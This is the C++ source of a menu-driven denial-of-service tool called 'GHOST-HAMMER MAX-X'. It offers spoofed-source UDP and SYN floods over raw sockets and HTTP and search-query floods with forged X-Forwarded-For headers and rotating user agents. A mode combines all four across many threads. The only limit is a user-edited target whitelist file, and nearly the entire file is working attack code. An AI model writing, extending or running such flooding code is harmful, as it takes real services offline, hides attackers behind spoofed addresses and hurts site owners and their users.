// ghost_hammer.cpp
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <csignal>
#include <cstdlib>
#include <unistd.h>
#include <thread>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <chrono>
#include <cstring>
using namespace std;

bool running = true;
vector<string> allowed_targets;

// ===== Utility =====
void clear_screen() { system("clear"); }

void load_whitelist() {
    ifstream file("allowed_targets.txt");
    string line;
    while (getline(file, line)) {
        if (!line.empty()) allowed_targets.push_back(line);
    }
}

bool is_whitelisted(const string &target) {
    for (auto &t : allowed_targets) {
        if (t == target) return true;
    }
    return false;
}

void sigint_handler(int) {
    running = false;
    cout << "\n[!] Attack stopped by user.\n";
}

string random_ip() {
    return to_string(rand() % 256) + "." +
           to_string(rand() % 256) + "." +
           to_string(rand() % 256) + "." +
           to_string(rand() % 256);
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

string random_user_agent() {
    vector<string> agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
    };
    return agents[rand() % agents.size()];
}

string random_keyword() {
    string chars = "abcdefghijklmnopqrstuvwxyz";
    string word;
    int len = 3 + rand() % 8;
    for (int i = 0; i < len; i++)
        word += chars[rand() % chars.size()];
    return word;
}

unsigned short tcp_checksum(const void *buff, unsigned short len_tcp,
                            unsigned int src_addr, unsigned int dest_addr) {
    const unsigned short *buf = (unsigned short *)buff;
    unsigned short *ip_src = (unsigned short *)&src_addr;
    unsigned short *ip_dst = (unsigned short *)&dest_addr;
    unsigned long sum = 0;
    int len = len_tcp;
    sum += ip_src[0] + ip_src[1];
    sum += ip_dst[0] + ip_dst[1];
    sum += htons(IPPROTO_TCP);
    sum += htons(len_tcp);
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// ===== Attacks =====
void udp_flood(string target_ip, int port, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return;
    char packet[4096];
    sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);
    iphdr *iph = (iphdr *)packet;
    udphdr *udph = (udphdr *)(packet + sizeof(iphdr));
    udph->dest = htons(port);
    udph->len = htons(sizeof(udphdr));
    udph->check = 0;
    auto end_time = chrono::steady_clock::now() + chrono::seconds(duration);
    while (running && chrono::steady_clock::now() < end_time) {
        memset(packet, 0, sizeof(packet));
        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = htons(sizeof(iphdr) + sizeof(udphdr));
        iph->id = htons(rand() % 65535); iph->frag_off = 0; iph->ttl = 64;
        iph->protocol = IPPROTO_UDP; iph->check = 0;
        iph->saddr = inet_addr(random_ip().c_str());
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)packet, iph->ihl << 2);
        udph->source = htons(rand() % 65535);
        sendto(sock, packet, sizeof(iphdr) + sizeof(udphdr), 0,
               (sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}

void syn_flood(string target_ip, int port, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;
    char packet[4096];
    sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);
    iphdr *iph = (iphdr *)packet;
    tcphdr *tcph = (tcphdr *)(packet + sizeof(iphdr));
    auto end_time = chrono::steady_clock::now() + chrono::seconds(duration);
    while (running && chrono::steady_clock::now() < end_time) {
        memset(packet, 0, sizeof(packet));
        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = htons(sizeof(iphdr) + sizeof(tcphdr));
        iph->id = htons(rand() % 65535); iph->frag_off = 0; iph->ttl = 64;
        iph->protocol = IPPROTO_TCP; iph->check = 0;
        iph->saddr = inet_addr(random_ip().c_str());
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)packet, iph->ihl << 2);
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(port); tcph->seq = rand(); tcph->ack_seq = 0;
        tcph->doff = 5; tcph->syn = 1; tcph->window = htons(5840);
        tcph->check = tcp_checksum(tcph, sizeof(tcphdr), iph->saddr, iph->daddr);
        sendto(sock, packet, sizeof(iphdr) + sizeof(tcphdr), 0,
               (sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}

void http_flood(string host, string path, int port, int duration) {
    auto end_time = chrono::steady_clock::now() + chrono::seconds(duration);
    while (running && chrono::steady_clock::now() < end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        hostent *server = gethostbyname(host.c_str());
        if (!server) { close(sock); continue; }
        sockaddr_in serv_addr{};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);
        memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        if (connect(sock, (sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sock);
            continue;
        }
        for (int i = 0; i < 20 && running; i++) {
            string request = "GET " + path + " HTTP/1.1\r\n";
            request += "Host: " + host + "\r\n";
            request += "User-Agent: " + random_user_agent() + "\r\n";
            request += "X-Forwarded-For: " + random_ip() + "\r\n";
            request += "Connection: keep-alive\r\n\r\n";
            send(sock, request.c_str(), request.size(), 0);
        }
        close(sock);
    }
}

void search_flood(string host, string search_path, int port, int duration) {
    auto end_time = chrono::steady_clock::now() + chrono::seconds(duration);
    while (running && chrono::steady_clock::now() < end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        hostent *server = gethostbyname(host.c_str());
        if (!server) { close(sock); continue; }
        sockaddr_in serv_addr{};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);
        memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        if (connect(sock, (sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sock);
            continue;
        }
        for (int i = 0; i < 20 && running; i++) {
            string query = "?q=" + random_keyword();
            string request = "GET " + search_path + query + " HTTP/1.1\r\n";
            request += "Host: " + host + "\r\n";
            request += "User-Agent: " + random_user_agent() + "\r\n";
            request += "X-Forwarded-For: " + random_ip() + "\r\n";
            request += "Connection: keep-alive\r\n\r\n";
            send(sock, request.c_str(), request.size(), 0);
        }
        close(sock);
    }
}

// ===== Menu =====
void menu() {
    cout << "=============================\n";
    cout << " GHOST-HAMMER MAX-X\n";
    cout << " CYBER GHOST | ALPHA | SIG X\n";
    cout << "=============================\n";
    cout << "[1] UDP Flood (Spoofed)\n";
    cout << "[2] SYN Flood (Spoofed)\n";
    cout << "[3] HTTP Flood (Persistent)\n";
    cout << "[4] Search Query Flood\n";
    cout << "[5] MAX-X Mode (All Attacks)\n";
    cout << "[0] Exit\n";
    cout << "=============================\n> ";
}

// ===== Main =====
int main() {
    signal(SIGINT, sigint_handler);
    load_whitelist();
    while (running) {
        clear_screen();
        menu();
        int choice;
        cin >> choice;
        if (choice == 0) break;
        string target;
        cout << "Enter target (IP/domain): ";
        cin >> target;
        if (!is_whitelisted(target)) {
            cout << "[X] Target not in allowed list!\n";
            sleep(2);
            continue;
        }
        if (choice == 1) {
            int port, duration, threads;
            cout << "Port: "; cin >> port;
            cout << "Duration (seconds): "; cin >> duration;
            cout << "Threads: "; cin >> threads;
            vector<thread> workers;
            for (int i = 0; i < threads; i++)
                workers.emplace_back(udp_flood, target, port, duration);
            for (auto &t : workers) t.join();
        }
        else if (choice == 2) {
            int port, duration, threads;
            cout << "Port: "; cin >> port;
            cout << "Duration (seconds): "; cin >> duration;
            cout << "Threads: "; cin >> threads;
            vector<thread> workers;
            for (int i = 0; i < threads; i++)
                workers.emplace_back(syn_flood, target, port, duration);
            for (auto &t : workers) t.join();
        }
        else if (choice == 3) {
            string path;
            int port, duration, threads;
            cout << "Path (e.g. /): "; cin >> path;
            cout << "Port: "; cin >> port;
            cout << "Duration (seconds): "; cin >> duration;
            cout << "Threads: "; cin >> threads;
            vector<thread> workers;
            for (int i = 0; i < threads; i++)
                workers.emplace_back(http_flood, target, path, port, duration);
            for (auto &t : workers) t.join();
        }
        else if (choice == 4) {
            string path;
            int port, duration, threads;
            cout << "Search path (e.g. /search): "; cin >> path;
            cout << "Port: "; cin >> port;
            cout << "Duration (seconds): "; cin >> duration;
            cout << "Threads: "; cin >> threads;
            vector<thread> workers;
            for (int i = 0; i < threads; i++)
                workers.emplace_back(search_flood, target, path, port, duration);
            for (auto &t : workers) t.join();
        }
        else if (choice == 5) {
            string http_path, search_path;
            int port, duration, threads;
            cout << "HTTP path (e.g. /): "; cin >> http_path;
            cout << "Search path (e.g. /search): "; cin >> search_path;
            cout << "Port: "; cin >> port;
            cout << "Duration (seconds): "; cin >> duration;
            cout << "Threads per attack: "; cin >> threads;
            vector<thread> workers;
            for (int i = 0; i < threads; i++)
                workers.emplace_back(udp_flood, target, port, duration);
            for (int i = 0; i < threads; i++)
                workers.emplace_back(syn_flood, target, port, duration);
            for (int i = 0; i < threads; i++)
                workers.emplace_back(http_flood, target, http_path, port, duration);
            for (int i = 0; i < threads; i++)
                workers.emplace_back(search_flood, target, search_path, port, duration);
            for (auto &t : workers) t.join();
        }
    }
    return 0;
}
